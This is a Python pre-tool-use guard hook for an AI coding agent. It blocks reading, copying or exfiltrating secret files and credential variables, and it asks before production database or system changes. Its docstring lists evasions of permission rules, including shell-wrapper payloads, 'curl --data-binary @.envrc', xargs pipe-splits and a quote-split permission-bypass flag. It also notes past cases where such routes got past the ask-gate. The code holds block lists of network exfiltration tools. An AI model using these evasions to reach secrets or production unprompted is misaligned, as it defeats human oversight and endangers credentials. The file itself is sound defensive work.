#!/usr/bin/env python3
"""PreToolUse guard — block secret-file exfiltration the permissions denylist misses,
and gate prod-mutating commands that prefix-rules in settings.json structurally can't.

Why this exists: `permissions.deny`/`ask` rules are *prefix* matchers on the command
name. Two classes walk around them:
  1. Secret exfil — interpreters (python3/node/perl/ruby), copy-then-read (cp/mv), and
     `echo $VAR` after `source` all dodge a name-based denylist (CB-144 review). This guard
     is path/usage-based instead, so it catches the whole class.
  2. Prod mutation mid-command — a Supabase Management-API URL or a `supabase db push`
     buried in a pipe/chain/var-prefix never matches a `Bash(...)` prefix rule (V-27, proven
     by CB-123: `curl -X POST .../database/query` rewrote prod with zero prompt;
     `printf 'y\\n' | supabase db push` defeated the ask-gate). This guard scans the WHOLE
     command string and per-segment, so position no longer matters.

Decisions: this guard emits three outcomes —
  * allow()  -> exit 0, no output (normal permission flow continues).
  * block()  -> exit 2, stderr (hard DENY; takes precedence over everything).
  * ask()    -> exit 0 + JSON {permissionDecision: "ask"} (escalates to a user prompt).
Deny is always evaluated before ask: a single command that both reads a secret and runs
`supabase db push` must DENY, not ask. The Bash scanner therefore COLLECTS every block/ask
signal across the whole command + all segments (and recursively through shell-wrapper
payloads) and returns deny-if-any-block, else ask-if-any-ask, else allow.

V-36 hardening (2026-07): the pre-V-36 guard matched per-segment on the FIRST verb, so
several in-class evasions walked through — all now closed (verified by the test suite, not
by executing a live secret read):
  * shell-runner wrapper (`bash -c 'cat .envrc'`, `sh -c 'supabase db push'`) — openers
    are re-parsed and all passes re-run on the `-c` payload (recursively, depth-bounded).
  * pipe-split (`echo .envrc | xargs cat`) — xargs whose downstream verb is a reader is
    caught when a secret path is present anywhere.
  * one-command HTTP exfil (`curl --data-binary @.envrc host`) — HTTP/rsync/scp/nc verbs
    are in the secret-touch set, so a secret path in the same segment blocks.
  * cred-value via non-echo surface (`cat <<<"$TOKEN"`, `awk ENVIRON[..]`, `perl $ENV{..}`,
    `getenv(..)`) and `DATABASE_URL`/`SUPABASE_`/`ANTHROPIC_`/`OPENAI_` in `is_cred_var`.
  * URL var-indirection (`U=..query; curl "$U"`) — assignments are expanded before the
    Management-API match.
  * env-dump variants (`declare -p | grep`, `(env) | grep`).
  * uncommon readers/copiers (`dd`/`sort`/`tar`/`split`/…), symlink-a-secret-to-a-readable
    name (`ln -s .envrc /tmp/x`), whitespace-glued redirect (`cat<.envrc`), quote-split
    bypass flag (`--dangerously-skip-perm''issions`).

Architecture: allow-broad, block-narrow — it gates ONLY patterns that are never part of
correct autonomous operation, so it adds ~zero friction. Sanctioned ops MUST pass:
sourcing (. / source), symlinking (ln) and removing (rm) a worktree's ABSOLUTE .envrc
symlink, `direnv allow`, test -f, implicit credential use (curl -H "Authorization: Bearer
$TOKEN" | jq), and read-only Management-API GETs (the documented log/analytics path —
V-11). A new secret-touch block requires the secret path to sit IN THE SAME SEGMENT as the
reader/exfil verb — so `. ./.envrc; <cmd that happens to read a non-secret file>` (different
segments) stays allowed.

Safety: FAILS OPEN. Any parse/logic error -> exit 0 (allow). It is defense-in-depth
layered on permissions.deny/ask, never the sole control, so a bug here must not be able to
brick Bash/Read globally. Only a *confirmed* match exits 2 (block) or emits ask-JSON.
"""
import sys, json, re, shlex


def allow():
    sys.exit(0)


def block(reason):
    sys.stderr.write(
        "BLOCKED by access guard: " + reason + "\n"
        "Sanctioned pattern: `. ./.envrc` then use vars IMPLICITLY "
        "(e.g. curl -H \"Authorization: Bearer $TOKEN\" | jq). "
        "Never read a secret file to stdout, copy it to a readable name, echo a "
        "credential value, overwrite/delete a secret file via a relative path, or run "
        "raw SQL against prod. "
        "See ~/.claude/workflow-conventions.md convention 5.\n")
    sys.exit(2)


def ask(reason):
    """Escalate to a user-confirmation prompt (PreToolUse JSON contract; exit 0)."""
    sys.stdout.write(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "ask",
        "permissionDecisionReason": reason,
    }}) + "\n")
    sys.exit(0)


# High-confidence secret-file paths (kept tight to avoid false positives).
SECRET_PATH = re.compile(
    r"(\.envrc"
    r"|\.env(\.[A-Za-z0-9_.-]+)?"
    r"|[^\s'\";|&]*\.pem"
    r"|[^\s'\";|&]*\.key"
    r"|\bid_(rsa|dsa|ecdsa|ed25519)\b"
    r"|/\.ssh/"
    r"|[^\s'\";|&]*credentials[^\s'\";|&]*)",
    re.IGNORECASE)

# Non-secret env templates — explicitly safe to read.
SAFE_ENV = re.compile(r"\.env\.(example|sample|template|dist|defaults?)\b", re.IGNORECASE)

# V-38: raw session-transcript JSONLs under ~/.claude/projects/ hold cleartext secrets
# (the e7900561 leak class). Scoped strictly to .claude/projects/** so unrelated .jsonl
# files elsewhere are unaffected. The ONLY sanctioned read path is the redacting verb
# `node ~/.claude/bin/transcript-resolver.mjs` (every byte it emits passes redact() first),
# so raw reads DENY while that verb stays allowlisted (V-4: allow the verb, not the dir).
TRANSCRIPT_PATH = re.compile(r"\.claude/projects/[^\s'\";|&]*\.jsonl\b", re.IGNORECASE)
RESOLVER_RUNTIMES = {"node", "deno", "bun"}

# --- V-27: Supabase Management-API + db-push prod-mutation gates ---
# Raw-SQL endpoint (POST-only; runs arbitrary DDL/DML against prod) -> hard DENY.
MGMT_DB_QUERY = re.compile(
    r"api\.supabase\.com/v1/projects/[^/\s'\";|&]+/database/query", re.IGNORECASE)
# Any project endpoint (config/* etc.) -> ASK when combined with a write method/body.
MGMT_PROJECT = re.compile(r"api\.supabase\.com/v1/projects/", re.IGNORECASE)
# Write intent on an HTTP-client invocation. `-X` may be glued to the method (idiomatic
# curl: `-XPOST`), so the short form takes optional whitespace; `--request` needs a sep.
CURL_WRITE_METHOD = re.compile(
    r"(?:-X\s*|--request[\s=]+)['\"]?(?:PATCH|POST|PUT|DELETE)\b", re.IGNORECASE)
CURL_BODY = re.compile(
    r"(?:^|\s)(?:-d|--data|--data-raw|--data-binary|--data-urlencode)\b")
HTTP_CLIENTS = {"curl", "wget", "http", "https", "xh"}
# V-36: any network-egress client that can carry a secret file off-box. Used with a
# per-segment secret-path check so `curl --data-binary @.envrc host` (read + exfil in one
# unprompted command) blocks — curl/rsync were previously excluded from the secret arm.
NET_EXFIL = HTTP_CLIENTS | {"rsync", "scp", "sftp", "ftp", "tftp", "nc", "ncat", "socat"}

READERS = {
    "cat", "head", "tail", "less", "more", "nl", "tac", "cut", "tr", "rev", "fold",
    "paste", "join", "column", "expand", "unexpand", "pr", "od", "xxd", "hexdump",
    "strings", "base64", "base32", "bat", "batcat", "grep", "egrep", "fgrep", "rg",
    "ag", "sed", "gawk", "awk", "perl", "python", "python2", "python3", "ruby",
    "node", "deno", "bun", "php", "tee", "vi", "vim", "view", "nano", "emacs",
    # V-36: emit-content readers previously missing from the set.
    "sort", "shuf", "split", "csplit", "comm", "look", "fmt", "openssl", "dd",
    "cksum", "sum", "md5", "md5sum", "shasum", "sha1sum", "sha256sum", "sha512sum",
}
# V-36: copy/stage-to-readable-name via a non-cp verb (dd of=, tar cf, cpio, pax).
COPIERS = {"cp", "mv", "install", "dd", "tar", "cpio", "pax"}   # rsync/scp -> NET_EXFIL

# Verbs whose mere presence as a WORD in a segment carrying a secret path is exfil/read.
# Word-search (not first-verb) so a glued redirect (`cat<.envrc`), a reordered redirect
# (`<.envrc cat`), or an interpreter deeper in the segment is caught. Per-segment + a
# literal secret path in that segment keeps false positives near zero (a bare `. ./.envrc`
# in its own segment carries no reader word).
SECRET_TOUCH = READERS | COPIERS | NET_EXFIL

# V-36: shell wrappers whose `-c` payload the pre-V-36 guard never re-parsed.
SHELL_OPENERS = {"sh", "bash", "zsh", "ksh", "dash", "ash"}
MAX_DEPTH = 4

# V-36: credential-value surfaces beyond echo/printf/print.
#   herestring feeding any reader: `cat <<<"$TOKEN"`, `tee <<< $TOKEN`
HERESTRING_VAR = re.compile(r"<<<\s*[\"']?\$\{?\s*([A-Za-z_][A-Za-z0-9_]*)")
#   interpreter env access: awk ENVIRON[..], perl $ENV{..}, getenv(..), os.environ[..]/.get(..)
ENV_ACCESS_VAR = re.compile(
    r"(?:ENVIRON\s*\[\s*|\$ENV\s*[\[{]\s*|\bgetenv\s*\(\s*"
    r"|\benviron\s*(?:\.get\s*\(\s*|\[\s*))[\"']?([A-Za-z_][A-Za-z0-9_]*)")

# --- V-63: live-system-mutation gates. Post-merge "activation" actions ride OUTSIDE
# the reviewed PR diff -- a cron install, a launchd/systemd unit, a settings-perms
# edit, a permission-bypass flag (the V-52 class: `--dangerously-skip-permissions`
# buried in a `crontab -` line that no PR review and no settings.json prefix-rule saw).
BYPASS_FLAG = re.compile(
    r"--(?:allow-)?dangerously-skip-permissions\b"
    r"|--permission-mode[=\s]+['\"]?bypassPermissions\b", re.IGNORECASE)
LAUNCHCTL_WRITE = {"load", "unload", "bootstrap", "bootout", "enable", "disable",
                   "kickstart", "kill", "remove", "submit", "setenv", "unsetenv",
                   "attach", "reboot"}
SYSTEMCTL_WRITE = {"enable", "disable", "start", "stop", "restart", "reload",
                   "try-restart", "reload-or-restart", "mask", "unmask",
                   "daemon-reload", "daemon-reexec", "set-default", "isolate",
                   "kill", "edit", "link", "preset", "set-property"}
SETTINGS_PATH = re.compile(r"settings(?:\.local)?\.json$", re.IGNORECASE)
# V-36: env-dumping producers that surface all credential values (regardless of pipe
# adjacency / a wrapping subshell). `printenv` alone dumps; `declare -p`/`typeset -p`
# print every variable WITH values; `(env) | grep` and `(set) | grep` dodge the old
# adjacency regex via the `)`.
DECLARE_DUMP = re.compile(r"\b(?:declare|typeset)\s+-[A-Za-z]*p\b")
ENV_GREP_DUMP = re.compile(
    r"(?:^|[\s(;&|])(?:env|set)\s*\)?\s*\|\s*"
    r"(?:grep|egrep|fgrep|rg|cat|awk|sed|tee|head|tail|less|more|sort|nl|cut)\b")


def first_subcommand(toks, i):
    """First non-flag token after the verb (skips `--user`, `-q`, ...)."""
    for t in toks[i + 1:]:
        if not t.startswith("-"):
            return t
    return None


def is_cred_var(name):
    n = name.upper()
    if re.search(r"(SECRET|TOKEN|PASSWORD|PASSWD|BEARER|DSN|CREDENTIAL)", n):
        return True
    if re.search(r"(_KEY|^KEY|API_?KEY)$", n):
        return True
    # V-36: connection-string + provider vars the hard_deny names but the pattern missed.
    if re.search(r"(DATABASE_URL|SUPABASE_|ANTHROPIC_|OPENAI_|GH_TOKEN|GITHUB_TOKEN)", n):
        return True
    return False


def is_relative(path):
    """A cwd/home-dependent path (bare, ./, ../, ~/, $VAR-prefixed) -- one a failed `cd`
    can silently redirect onto the wrong file (the V-332 vector). An absolute '/...' path
    is cwd-immune, so an explicit absolute worktree-symlink op stays allowed."""
    return not path.startswith("/")


def secret_in(text):
    """secret path present, excluding safe .env templates"""
    m = SECRET_PATH.search(text)
    if not m:
        return False
    # if the only match is a safe template, treat as non-secret
    if SAFE_ENV.search(text) and not re.search(
            r"(\.envrc|\.pem|\.key|id_(rsa|dsa|ecdsa|ed25519)|/\.ssh/|credentials)", text, re.I):
        # re-check there isn't ALSO a real .env (non-template) reference
        stripped = SAFE_ENV.sub("", text)
        return bool(SECRET_PATH.search(stripped))
    return True


def segments(cmd):
    """Split a command into pipeline/chain segments (spans | || && ; & and newlines)."""
    return re.split(r"(?:\|\||&&|\||;|&|\n)", cmd)


def verb_of(seg):
    """Return (verb, tokens, idx) for a segment, skipping leading VAR=val assignments.
    verb is None when the segment is empty / assignment-only. Redirection operators glued
    to the verb (`cat<f`) or leading (`<f cat`) are spaced out first so the real verb is
    seen (V-36)."""
    norm = re.sub(r"(?<![<>&\d])<(?!<)", " < ", seg)      # space a lone input redirect
    toks = [t for t in norm.split() if t not in ("<", ">", ">>", "<<")]
    i = 0
    while i < len(toks) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", toks[i]):
        i += 1  # skip leading VAR=val assignments (env-setter form)
    if i >= len(toks):
        return None, toks, i
    return toks[i].split("/")[-1], toks, i


def is_resolver(verb, toks, i):
    """The sanctioned redacting reader (`node ~/.claude/bin/transcript-resolver.mjs ...`).
    Keyed on the INVOKED program -- the script arg immediately after the runtime (toks[i+1])
    -- so neither mere mention (`cat $(... transcript-resolver.mjs ...)`) nor an eval-mode
    smuggle (`node -e '<exfil>' transcript-resolver.mjs`) earns the exemption."""
    return (verb in RESOLVER_RUNTIMES and i + 1 < len(toks)
            and toks[i + 1].split("/")[-1] == "transcript-resolver.mjs")


def opener_payload(seg):
    """For a shell-runner segment (`bash -c 'PAYLOAD'`), return the de-quoted PAYLOAD so it
    can be re-scanned; None when there is no `-c`-style form (e.g. `bash script.sh`)."""
    try:
        toks = shlex.split(seg)
    except ValueError:
        return None
    for j, t in enumerate(toks):
        if t.split("/")[-1] in SHELL_OPENERS:
            for k in range(j + 1, len(toks)):
                tk = toks[k]
                if re.fullmatch(r"-[A-Za-z]*c", tk):     # -c, -lc, -ic, ... (cluster ending c)
                    return toks[k + 1] if k + 1 < len(toks) else None
                if not tk.startswith("-"):
                    return None                          # first non-flag = script file, not -c
            return None
    return None


def env_subcommand(seg):
    """For `env [FLAGS] [VAR=val ...] cmd args`, return the inner `cmd args` (re-quoted) so
    it can be re-scanned; None for a bare `env` (a dump, handled elsewhere)."""
    try:
        toks = shlex.split(seg)
    except ValueError:
        return None
    if not toks or toks[0].split("/")[-1] != "env":
        return None
    j = 1
    while j < len(toks):
        t = toks[j]
        if t.startswith("-") or re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", t):
            j += 1
            continue
        break
    if j < len(toks):
        return " ".join(shlex.quote(x) for x in toks[j:])
    return None


def expand_assignments(cmd):
    """Substitute leading `VAR=val` assignments back into `$VAR`/`${VAR}` uses, so a
    Management-API URL hidden behind indirection (`U=..query; curl "$U"`) is visible to the
    prod-DDL match (V-36)."""
    assign = {}
    for m in re.finditer(r"(?:^|[\s;&|])([A-Za-z_][A-Za-z0-9_]*)=([^\s'\";|&]+)", cmd):
        assign[m.group(1)] = m.group(2)
    if not assign:
        return cmd
    return re.sub(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?",
                  lambda m: assign.get(m.group(1), m.group(0)), cmd)


def scan_bash(cmd, depth=0):
    """Return (decision, reason): decision in {'block','ask',None}. Collects every signal
    across the whole command + all segments (+ recursively through shell-opener payloads),
    then resolves DENY-before-ASK. depth-bounded so a pathological nest can't loop."""
    blocks, asks = [], []
    segs = [s.strip() for s in segments(cmd) if s.strip()]

    # ===== whole-command DENY =====
    if re.search(r"\bprintenv\b", cmd):
        blocks.append("`printenv` surfaces credential env values.")
    if re.search(r"\b(env|set)\s*\|\s*(grep|egrep|fgrep|rg|cat|awk|sed|tee|head|tail)\b", cmd) \
            or ENV_GREP_DUMP.search(cmd):
        blocks.append("dumping the environment into a reader (env|grep / (env)|grep / set|grep).")
    if DECLARE_DUMP.search(cmd):
        blocks.append("`declare -p`/`typeset -p` prints every variable WITH its value "
                      "(dumps credentials).")
    # Permission-bypass flag anywhere — also test a de-quoted copy so intra-token quoting
    # (`--dangerously-skip-perm''issions`) that bash reassembles cannot split the literal.
    if BYPASS_FLAG.search(cmd) or BYPASS_FLAG.search(cmd.replace("'", "").replace('"', "")):
        blocks.append("a permission-bypass flag (--dangerously-skip-permissions / "
                      "--permission-mode bypassPermissions) -- never apply this silently. "
                      "Run without it, or get explicit human sign-off first.")
    for m in re.finditer(r"(?:\d*>>?|&>>?|>\|)\s*['\"]?([^\s'\";|&<>()]+)", cmd):
        if secret_in(m.group(1)):
            blocks.append("output redirect to a secret file (" + m.group(1) + ") -- writing a "
                          "secret via shell redirect overwrites/corrupts it.")
    # Credential-value surfaces beyond echo/printf/print (V-36).
    for m in HERESTRING_VAR.finditer(cmd):
        if is_cred_var(m.group(1)):
            blocks.append("herestring surfacing a credential variable ($" + m.group(1) + ").")
    for m in ENV_ACCESS_VAR.finditer(cmd):
        if is_cred_var(m.group(1)):
            blocks.append("interpreter env access surfacing a credential ($" + m.group(1) + ").")
    # Management-API raw SQL, with var-indirection expanded (V-36).
    expanded = expand_assignments(cmd)
    if (MGMT_DB_QUERY.search(cmd) or MGMT_DB_QUERY.search(expanded)) \
            and re.search(r"\b(?:curl|wget|http|https|xh)\b", cmd):
        blocks.append("raw SQL to the Supabase Management API database/query endpoint "
                      "(arbitrary prod DDL/DML — go through supabase/migrations or not at all).")

    # ===== per-segment DENY =====
    for s in segs:
        verb, toks, i = verb_of(s)
        if verb is None:
            continue

        # Shell-runner wrapper: re-scan the -c payload (V-358).
        if verb in SHELL_OPENERS and depth < MAX_DEPTH:
            payload = opener_payload(s)
            if payload:
                d, r = scan_bash(payload, depth + 1)
                if d == "block":
                    blocks.append(r)
                elif d == "ask":
                    asks.append(r)
        # `env [VAR=v] cmd` runner: re-scan the inner command (V-358).
        if verb == "env" and depth < MAX_DEPTH:
            sub = env_subcommand(s)
            if sub:
                d, r = scan_bash(sub, depth + 1)
                if d == "block":
                    blocks.append(r)
                elif d == "ask":
                    asks.append(r)

        if verb == "direnv" and i + 1 < len(toks) and toks[i + 1] == "exec":
            blocks.append("`direnv exec` is banned — symlink .envrc instead (convention 5).")

        # Secret read / copy / exfil: a secret path in this segment whose EFFECTIVE VERB is a
        # reader/copier/net-exfil command. Keyed on the verb (verb_of normalizes a glued
        # redirect `cat<.envrc` -> verb `cat`), NOT a word-search over the whole segment: a
        # word-search over-blocks legit commands whose ARGUMENTS merely mention a secret path
        # + a reader word (`git commit -m "...cat...envrc"`, `gh pr create --body "...sed..."`).
        # Residual (defense-in-depth): a transparent wrapper (`time`/`nice`/`nohup cat .envrc`)
        # or a leading-redirect-before-verb (`<.envrc cat`) puts the reader out of verb position;
        # the sh/bash/env opener recursion + the xargs check cover the wrapper classes that matter.
        if secret_in(s) and verb in SECRET_TOUCH:
            blocks.append("reading/copying/exfiltrating a secret file (reader/copier/net verb "
                          "on a secret path in one command).")
        if TRANSCRIPT_PATH.search(s) and verb in SECRET_TOUCH \
                and not is_resolver(verb, toks, i):
            blocks.append("raw read/copy of a session transcript -- these hold cleartext "
                          "secrets. Use `node ~/.claude/bin/transcript-resolver.mjs read ...`.")
        # Pipe-split: `echo .envrc | xargs cat` (V-359). Secret in one segment, reader after
        # xargs in another; catch when xargs' downstream verb reads and a secret is present.
        if verb == "xargs" and secret_in(cmd):
            # Scan EVERY non-flag token downstream of xargs for a reader/copier/net verb,
            # not just the first (V-36 fix): `xargs -I {} cat {}` puts the `{}` placeholder
            # in first position, hiding the `cat`. Placeholders (`{}`/`%`) are not in
            # SECRET_TOUCH, so they are skipped and the real reader is found.
            for t in toks[i + 1:]:
                if not t.startswith("-") and t.split("/")[-1] in SECRET_TOUCH:
                    blocks.append("piping a secret path into a reader via xargs "
                                  "(`... | xargs ... " + t.split("/")[-1] + "`).")
                    break

        # V-332 WRITE/CLOBBER: link-level ops (rm/ln/unlink) on a RELATIVE secret target.
        if verb in ("rm", "ln", "unlink"):
            nonflag = [t for t in toks[i + 1:] if not t.startswith("-")]
            victims = [nonflag[-1]] if (verb == "ln" and nonflag) else nonflag
            for v in victims:
                if secret_in(v) and is_relative(v):
                    blocks.append("destructive `" + verb + "` on a relative secret path (" + v
                                  + ") -- a failed `cd` can resolve this onto the real .envrc "
                                  "(V-332). Use an absolute path, or bin/ensure-envrc.sh.")
            # V-36: symlink a secret SOURCE to a NON-secret readable name (exfil staging).
            # `ln -s .envrc /tmp/x` — the bootstrap (secret->secret) stays allowed.
            if verb == "ln" and len(nonflag) >= 2:
                src, dst = nonflag[0], nonflag[-1]
                if secret_in(src) and not secret_in(dst):
                    blocks.append("symlinking a secret file (" + src + ") to a readable name ("
                                  + dst + ") -- stages a secret for read-through. ")
        # Content-destroying ops FOLLOW a symlink -> DENY any secret target.
        if verb in ("truncate", "shred"):
            for t in toks[i + 1:]:
                if not t.startswith("-") and secret_in(t):
                    blocks.append("content-destroying `" + verb + "` on a secret file (" + t + ").")

        if verb in ("echo", "printf", "print"):
            for m in re.finditer(r"\$\{?\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}?", s):
                if is_cred_var(m.group(1)):
                    blocks.append("echoing a credential variable ($" + m.group(1) + ").")

        # V-27 Hole 1 (deny half): raw SQL to the Management-API database/query endpoint.
        if verb in HTTP_CLIENTS and MGMT_DB_QUERY.search(s):
            blocks.append("raw SQL to the Supabase Management API database/query endpoint "
                          "(arbitrary prod DDL/DML — go through supabase/migrations or not at all).")

    # ===== per-segment ASK =====
    for s in segs:
        verb, toks, i = verb_of(s)
        if verb is None:
            continue

        if verb == "supabase" and i + 2 < len(toks) and toks[i + 1] == "db" \
                and toks[i + 2] in ("push", "reset"):
            asks.append("`supabase db " + toks[i + 2] + "` mutates the linked (prod) database. "
                        "Confirm before it runs — this gate fires regardless of command position "
                        "(pipe/chain/var-prefix), closing the prefix-rule evasion.")

        if verb == "sb-push" and "--apply" in toks[i + 1:]:
            asks.append("`sb-push --apply` pushes migrations to the linked (prod) Supabase DB. "
                        "Confirm before it runs — this gate fires regardless of command position "
                        "(leading cd/pipe/chain/var-prefix), closing the prefix-rule evasion.")

        if verb in HTTP_CLIENTS and MGMT_PROJECT.search(s) \
                and (CURL_WRITE_METHOD.search(s) or CURL_BODY.search(s)):
            asks.append("write to the Supabase Management API (prod config mutation). "
                        "Confirm before it runs. (Read-only GET log/analytics endpoints are allowed.)")

        if verb == "crontab":
            rest = toks[i + 1:]
            positional, has_l, has_write_flag, j = [], False, False, 0
            while j < len(rest):
                t = rest[j]
                if t == "-u":
                    j += 2
                    continue
                if t == "-l":
                    has_l = True
                elif t in ("-e", "-r", "-"):
                    has_write_flag = True
                elif not t.startswith("-"):
                    positional.append(t)
                j += 1
            read_only = has_l and not has_write_flag and not positional
            if not read_only:
                asks.append("`crontab` write (install/edit/remove a cron job) -- a post-merge "
                            "'activation' action outside the PR diff. Confirm it.")
        if verb == "launchctl" and first_subcommand(toks, i) in LAUNCHCTL_WRITE:
            asks.append("`launchctl " + str(first_subcommand(toks, i)) + "` mutates launchd "
                        "(load/enable a job). Confirm this live-system activation.")
        if verb == "systemctl" and first_subcommand(toks, i) in SYSTEMCTL_WRITE:
            asks.append("`systemctl " + str(first_subcommand(toks, i)) + "` mutates systemd "
                        "units. Confirm this live-system activation.")

    if blocks:
        return "block", blocks[0]
    if asks:
        return "ask", asks[0]
    return None, None


def run():
    raw = sys.stdin.read()
    event = json.loads(raw) if raw.strip() else {}
    tool = event.get("tool_name", "")
    ti = event.get("tool_input", {}) or {}

    # Read tool: block secret files regardless of location (closes the ~/.claude allow hole).
    if tool == "Read":
        fp = str(ti.get("file_path", "") or ti.get("path", ""))
        if fp and secret_in(fp):
            block("Read of a secret file (" + fp + ").")
        if fp and TRANSCRIPT_PATH.search(fp):
            block("Read of a raw session transcript (" + fp + ") -- these hold cleartext "
                  "secrets. Use `node ~/.claude/bin/transcript-resolver.mjs read ...` (redacts).")
        allow()

    # V-63: editing a Claude Code settings.json is a live-system mutation -> ask; and mirror
    # the Read secret-file block for writes to secret paths / transcripts.
    if tool in ("Edit", "Write", "MultiEdit"):
        fp = str(ti.get("file_path", "") or ti.get("path", ""))
        if fp and secret_in(fp):
            block("write to a secret file (" + fp + ").")
        if fp and TRANSCRIPT_PATH.search(fp):
            block("write to a raw session transcript (" + fp + ").")
        if fp and SETTINGS_PATH.search(fp):
            ask("edit to a Claude Code settings.json -- the harness permission set "
                "(permissions/allow/deny) lives here. Confirm before changing it.")
        allow()

    if tool != "Bash":
        allow()

    cmd = ti.get("command", "")
    if not isinstance(cmd, str) or not cmd:
        allow()

    decision, reason = scan_bash(cmd, 0)
    if decision == "block":
        block(reason)
    if decision == "ask":
        ask(reason)
    allow()


try:
    run()
except SystemExit:
    raise               # allow()/block()/ask() must propagate
except Exception:
    sys.exit(0)         # FAIL OPEN — never brick Bash/Read on a guard bug
